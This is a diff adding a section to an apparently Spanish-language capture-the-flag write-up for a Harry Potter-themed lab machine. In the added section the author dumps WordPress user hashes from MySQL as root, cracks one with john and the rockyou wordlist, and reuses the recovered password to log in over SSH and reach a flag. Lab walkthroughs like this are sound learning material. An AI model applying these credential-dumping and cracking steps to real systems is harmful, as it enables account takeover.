@@ -339,3 +339,35 @@ define('DB_COLLATE', 'utf8_general_ci');
 define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
 ?>
 ```
+
+Nos conectamos al base de datos con `mysql -u root -p` y listamos las bases de datos con `show databases;`. Cambiamos la base de datos actual a wordpress (`use wordpress`) y listamos las tablas con `show tables;`. De esa table nos interesa listar los wp_users así que hacemos `select * from wp_users;` y obtenemos el siguiente hash para el usuario hagrid98:
+
+* `$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.`
+
+Con esto creamos un fichero `hashes.txt` con el contenido `hagrid98:$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.` para poder crackearlo con john:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+
+Resultado:
+
+```text
+Using default input encoding: UTF-8
+Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password123      (  hagrid98)
+1g 0:00:00:00 DONE (2023-01-19 23:18) 11.11g/s 17066p/s 17066c/s 17066C/s 753951..mexico1
+Use the "--show --format=phpass" options to display all of the cracked passwords reliably
+Session completed
+```
+
+John nos dice que la contraseña del usuario es:
+
+* hagrid98: password123
+
+Teniendo esta contraseña del Wordpress, podemos probar a ver si el usuario ha reutilizado la misma para el usuario del sistema. Para ello intentamos conectarnos mediante ssh (`ssh hagrid98@10.0.0.100`) y verificamos que podemos autenticarnos como el usuario hagrid98.
+
+> En el directorio *home* del usuario hagrid98 podemos ver que está el primer *horcrux* (`/home/hagrid98/horcrux1.txt`).
